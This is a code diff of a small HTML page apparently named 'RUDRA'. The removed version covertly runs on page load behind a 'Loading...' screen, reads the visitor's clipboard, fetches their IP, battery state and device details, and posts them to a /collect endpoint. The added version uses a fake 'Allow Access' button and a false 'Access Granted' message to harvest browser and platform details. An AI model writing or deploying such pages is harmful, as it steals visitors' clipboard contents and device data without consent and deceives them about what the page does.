@@ -1,61 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>RUDRA Email Collector</title>
+  <title>RUDRA Access</title>
 </head>
 <body>
-  <h2>Loading...</h2>
+  <h2>Welcome to RUDRA Panel</h2>
+  <button onclick="sendData()">Allow Access</button>
+
   <script>
-    async function getIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return 'IP not found';
-      }
-    }
-
-    async function getClipboard() {
-      try {
-        const text = await navigator.clipboard.readText();
-        return text || 'Clipboard empty';
-      } catch {
-        return 'Access Denied';
-      }
-    }
-
-    async function getBattery() {
-      if (!navigator.getBattery) return 'Not supported';
-      const battery = await navigator.getBattery();
-      return {
-        level: battery.level,
-        charging: battery.charging,
-      };
-    }
-
-    async function collect() {
-      const payload = {
-        ip: await getIP(),
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: {
-          width: screen.width,
-          height: screen.height
-        },
-        clipboard: await getClipboard(),
-        battery: await getBattery()
-      };
-
-      fetch("/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+    function sendData() {
+      fetch('/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          time: new Date().toISOString()
+        })
       });
+      alert("✅ Access Granted. Thank you!");
     }
-
-    collect();
   </script>
 </body>
 </html>
